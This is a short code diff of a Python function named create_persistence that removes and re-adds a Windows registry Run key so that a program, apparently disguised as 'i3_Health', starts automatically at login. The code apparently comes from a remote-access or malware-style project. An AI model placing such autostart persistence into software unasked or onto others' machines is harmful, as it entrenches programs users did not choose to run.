@@ -40,9 +40,8 @@ def create_persistence():
 
 
         # delete the key in the registry editor that points to the app
-        delete_response_code = subprocess.call("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /v i3_Health /f", shell=True)
+        subprocess.call("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /v i3_Health /f", shell=True)
 
-        # if delete_response_code:
         # # adding a registry to the registry editor that points to the app
         subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ' + NEW_REG_ENTRY + ' /t REG_SZ /d "' + FINAL_PATH + '"', shell=True)
 
